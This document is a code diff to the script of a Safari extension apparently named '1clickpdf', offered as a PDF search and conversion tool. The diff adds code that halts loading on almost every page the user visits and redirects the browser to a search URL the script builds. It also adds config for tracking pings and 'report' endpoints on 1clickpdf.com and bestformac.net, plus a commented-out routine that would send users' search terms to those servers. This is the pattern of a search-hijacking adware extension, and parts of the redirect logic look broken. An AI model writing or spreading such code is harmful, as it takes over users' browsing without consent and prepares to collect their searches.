@@ -1,9 +1,39 @@
+var debugging = true;
+
+var keys = {
+storage: '1clickpdf',
+pdf_search: 'https://www.google.com/search?q=filetype%3Apdf%20{searchTerms}',
+omni_search: 'https://www.google.com/search?q={searchTerms}',
+    //omni_search: 'https://www.bing.com/search?q={searchTerms}',
+random: '849OQQ106&$kBDaN0iYPvyOlnCsXisi^',
+ver: safari.extension.displayVersion,
+os: navigator.appVersion.indexOf('Mac') != -1 ? 'mac' : 'win',
+country: '',
+report: true,
+ping: {
+check: (debugging ? 1 : 5) * 60 * 1000, // check every x minutes
+send: (debugging ? 0.1 : 24) * 60 * 60 * 1000, // send if passed more than x hours from last ping
+},
+domains: {
+main: 'http://1clickpdf.com',
+ping: 'http://1clickpdf.com',
+report: 'http://1clickpdf.com',
+save: 'http://1clickpdf.com',
+search: 'http://1clickpdf.com',
+typ: 'http://bestformac.net',
+},
+persistant: true,
+keywords: ['pdf', 'convert'],
+};
+
+
+
 console.log(location.href);
 
 safari.self.addEventListener("message", handleMessage);
-if(location.href.indexOf('q=Hello') < 0){
-    refresh();
-}
+//if(location.href.indexOf('q=Hello') < 0){
+//    refresh();
+//}
 
 if( ((location.href.indexOf('www.bing') > -1) && (location.href.indexOf('form=APMCS1')> -1)) ||
    ((location.href.indexOf('www.google') > -1) && (location.href.indexOf('/search?client=safari')> -1)) ||
@@ -11,10 +41,12 @@ if( ((location.href.indexOf('www.bing') > -1) && (location.href.indexOf('form=AP
 {
 	console.log("Step1");
     if(location.href.indexOf('q=Hello') < 0){
-        window.stop();
-        refresh();
-        
+//        window.stop();
+//        refresh();
     }
+    
+//        window.stop();
+//    onBeforeSearch()
 
 	console.log(document.URL);
 	var newurl = document.URL;
@@ -22,9 +54,14 @@ if( ((location.href.indexOf('www.bing') > -1) && (location.href.indexOf('form=AP
 //    onBeforeSearch(document);
 	
 }
+if(location.href.indexOf('convert.html') < 0 && (location.href.indexOf('filetype:pdf') < 0)){
+    window.stop();
+    onBeforeSearch();
+}
+
 function refresh() {
     
-    window.location.href = "https://www.google.com/search?client=safari&rls=en&q=Hello&ie=UTF-8&oe=UTF-8";
+//    window.location.href = "https://www.google.com/search?client=safari&rls=en&q=Hello&ie=UTF-8&oe=UTF-8";
 //     window.location.reload(true);
 //    var url = location.origin;
 //    var pathname = location.pathname;
@@ -49,7 +86,35 @@ function handleMessage(event) {
 //
 //    }
 
-	console.log(newUrl);
+    console.log(newUrl);
+}
+
+function onBeforeSearch() {
+    var searchUrl;
+    let params = (new URL(document.location)).searchParams;
+    let name = params.get("q");
+    var searchTerms = document.location.search;
+    
+    var semi_pos = document.location.href.indexOf(':');
+    if (keys.keywords.indexOf(searchTerms.toLowerCase().trim()) !== -1) {
+        searchUrl = safari.extension.baseURI + 'convert.html';
+    }
+    else if (semi_pos !== -1 && searchTerms.substring(0, semi_pos).toLowerCase() == 'pdf') {
+        searchUrl = keys.pdf_search.replace(/\{searchTerms\}/g, encodeURIComponent(searchTerms.substring(semi_pos + 1).trim()));
+    } else {
+        searchUrl = keys.omni_search.replace(/\{searchTerms\}/g, encodeURIComponent(searchTerms));
+//        storage.counter++;
+//        setTimeout(function() {
+//                   if (keys.report === true) {
+//                   SendRequest(urls.report(searchTerms), function(ret) {
+//                               log('reporting enabled: ' + searchTerms);
+//                               });
+//                   }
+//                   }, 50);
+//        Store.setItem(keys.storage, storage);
+    }
+    console.log('searchUrl: ' + searchUrl);
+    window.location.href = searchUrl;
 }
 
 
